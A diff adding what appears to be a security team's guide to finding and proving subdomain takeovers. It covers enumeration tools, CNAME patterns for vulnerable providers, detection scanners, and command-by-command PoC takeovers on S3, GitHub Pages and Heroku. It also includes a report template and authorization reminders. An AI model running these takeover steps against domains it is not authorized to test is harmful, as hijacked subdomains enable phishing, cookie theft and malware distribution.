@@ -1,0 +1,267 @@
+╔════════════════════════════════════════════════════════════════╗
+║     SUBDOMAIN TAKEOVER - COMPLETE END-TO-END WORKFLOW          ║
+╚════════════════════════════════════════════════════════════════╝
+
+GOAL: Find vulnerable subdomains and help network team fix them before
+      hackers exploit them.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📋 PHASE 1: SUBDOMAIN ENUMERATION (Gather ALL subdomains)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Step 1.1: Run Multiple Tools
+──────────────────────────────
+
+# Method 1: crt.sh (Certificate Transparency)
+curl -s "https://crt.sh/?q=%25.example.com&output=json" | \
+  jq -r '.[].name_value' | \
+  sed 's/\*\.//g' | \
+  sort -u > crtsh_subdomains.txt
+
+# Method 2: Subfinder
+subfinder -d example.com -o subfinder_subdomains.txt -all -silent
+
+# Method 3: Sublist3r
+python3 sublist3r.py -d example.com -o sublist3r_subdomains.txt
+
+# Optional: Amass (slower but thorough)
+amass enum -passive -d example.com -o amass_subdomains.txt
+
+
+Step 1.2: Combine ALL Results
+──────────────────────────────
+cat crtsh_subdomains.txt \
+    subfinder_subdomains.txt \
+    sublist3r_subdomains.txt \
+    amass_subdomains.txt 2>/dev/null | \
+    sort -u > all_subdomains.txt
+
+echo "[+] Total unique subdomains: $(wc -l < all_subdomains.txt)"
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📋 PHASE 2: PROBE FOR HTTP/HTTPS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+cat all_subdomains.txt | \
+  httpx -silent -status-code -title -follow-redirects \
+  -o httpx_results.txt
+
+# Extract error responses
+grep -E "\[404\]|\[403\]|\[502\]|\[503\]" httpx_results.txt > error_responses.txt
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📋 PHASE 3: CHECK DNS RECORDS (CRITICAL!)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# Check CNAME records for all subdomains
+cat all_subdomains.txt | while read subdomain; do
+    cname=$(dig +short CNAME $subdomain | tail -1)
+    if [ ! -z "$cname" ]; then
+        echo "$subdomain → $cname"
+    fi
+done > cname_records.txt
+
+# Filter for vulnerable CNAME patterns
+grep -E "amazonaws\.com|cloudfront\.net|azurewebsites\.net|herokuapp\.com|github\.io|bitbucket\.io|s3\.amazonaws\.com|shopify\.com|tumblr\.com|ghost\.io|zendesk\.com|surge\.sh|pantheon\.io" cname_records.txt > vulnerable_cnames.txt
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📋 PHASE 4: AUTOMATED TAKEOVER DETECTION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# Method 1: subjack
+subjack -w all_subdomains.txt -t 100 -timeout 30 -o subjack_vulnerable.txt -ssl -v
+
+# Method 2: nuclei (BEST - most up-to-date)
+cat all_subdomains.txt | \
+  nuclei -t ~/nuclei-templates/takeovers/ -silent -o nuclei_takeover.txt
+
+# Method 3: SubOver
+SubOver -l all_subdomains.txt -o subover_results.txt
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📋 PHASE 5: MANUAL VERIFICATION (Most Important!)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+For each potentially vulnerable subdomain:
+
+1. CHECK THE RESPONSE:
+   curl -L https://subdomain.example.com
+
+2. CHECK DNS:
+   dig CNAME subdomain.example.com
+   dig A subdomain.example.com
+
+3. IDENTIFY ERROR MESSAGES:
+
+AWS S3:
+  "NoSuchBucket"
+  "The specified bucket does not exist"
+
+GitHub Pages:
+  "There isn't a GitHub Pages site here"
+  "404 - Not Found"
+
+Heroku:
+  "No such app"
+  "There's nothing here, yet"
+
+Azure:
+  "404 Web Site not found"
+  "Error 404 - Web app not found"
+
+Shopify:
+  "Sorry, this shop is currently unavailable"
+
+Tumblr:
+  "There's nothing here"
+  "Whatever you were looking for doesn't currently exist"
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📋 PHASE 6: PROOF OF CONCEPT TAKEOVER
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+⚠️  GET AUTHORIZATION FIRST!
+
+EXAMPLE 1: AWS S3 Bucket Takeover
+──────────────────────────────────
+# Found: blog.example.com → old-blog.s3.amazonaws.com
+# Returns: "NoSuchBucket"
+
+# Create the bucket:
+aws s3 mb s3://old-blog --region us-east-1
+
+# Upload PoC:
+echo "<h1>Subdomain Takeover PoC - Security Team</h1>" > index.html
+aws s3 cp index.html s3://old-blog/ --acl public-read
+
+# Enable website:
+aws s3 website s3://old-blog --index-document index.html
+
+# Verify:
+curl http://blog.example.com
+
+
+EXAMPLE 2: GitHub Pages Takeover
+─────────────────────────────────
+# Found: docs.example.com → oldproject.github.io
+# Returns: "There isn't a GitHub Pages site here"
+
+# Create repo: oldproject.github.io
+# Add files:
+echo "docs.example.com" > CNAME
+echo "<h1>Subdomain Takeover PoC - Security Team</h1>" > index.html
+
+# Push and enable GitHub Pages
+# Verify:
+curl https://docs.example.com
+
+
+EXAMPLE 3: Heroku Takeover
+──────────────────────────
+# Found: api.example.com → old-api-app.herokuapp.com
+# Returns: "No such app"
+
+heroku create old-api-app
+echo "web: python -m http.server $PORT" > Procfile
+echo "<h1>Subdomain Takeover PoC</h1>" > index.html
+git init && git add . && git commit -m "PoC"
+heroku git:remote -a old-api-app
+git push heroku master
+
+# Verify:
+curl https://api.example.com
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📋 PHASE 7: DOCUMENTATION & REPORTING
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Take Screenshots:
+─────────────────
+1. Subdomain showing your PoC content
+2. DNS records (dig output)
+3. Service control (S3 console, GitHub repo, etc.)
+4. Error message before takeover
+
+Report Template:
+────────────────
+TITLE: Subdomain Takeover - [subdomain]
+
+SEVERITY: HIGH/CRITICAL
+
+AFFECTED: subdomain.example.com
+
+DETAILS:
+The subdomain points to an unclaimed external service.
+
+DNS RECORD:
+subdomain.example.com CNAME old-service.provider.com
+
+SERVICE: [Heroku/S3/GitHub/etc.]
+
+ERROR MESSAGE:
+[Screenshot of error]
+
+PROOF OF CONCEPT:
+1. Verified DNS points to: old-service.provider.com
+2. Service returned error: "No such app"
+3. Successfully claimed service with same name
+4. Subdomain now displays our content
+5. Screenshot: [attach]
+
+IMPACT:
+- Phishing attacks
+- Malware distribution
+- Cookie theft
+- Brand damage
+- Session hijacking
+
+REMEDIATION:
+Option 1: Remove DNS record immediately
+Option 2: Point to valid, active service
+Option 3: Claim the service yourself
+
+URGENCY: IMMEDIATE ACTION REQUIRED
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🎯 VULNERABLE SERVICE FINGERPRINTS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Service     | CNAME                    | Error Message
+────────────|──────────────────────────|───────────────────────
+S3          | *.s3.amazonaws.com       | NoSuchBucket
+GitHub      | *.github.io              | There isn't a GitHub
+Heroku      | *.herokuapp.com          | No such app
+Azure       | *.azurewebsites.net      | 404 Web Site not found
+Shopify     | *.myshopify.com          | Sorry, this shop
+Tumblr      | *.tumblr.com             | There's nothing here
+Ghost       | *.ghost.io               | The thing you were
+Zendesk     | *.zendesk.com            | Help Center Closed
+Fastly      | *.fastly.net             | Fastly error
+Surge       | *.surge.sh               | project not found
+WordPress   | *.wordpress.com          | Do you want to register
+Bitbucket   | *.bitbucket.io           | Repository not found
+Pantheon    | *.pantheonsite.io        | 404 error unknown site
+Statuspage  | *.statuspage.io          | You are being redirected
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+⚠️  IMPORTANT REMINDERS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+1. GET WRITTEN AUTHORIZATION before PoC
+2. Use BENIGN PoC content only
+3. REPORT IMMEDIATELY after discovery
+4. DON'T collect any user data
+5. CLEAN UP after demonstration
+6. This is HIGH/CRITICAL severity
+7. Can be exploited by anyone at any time
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
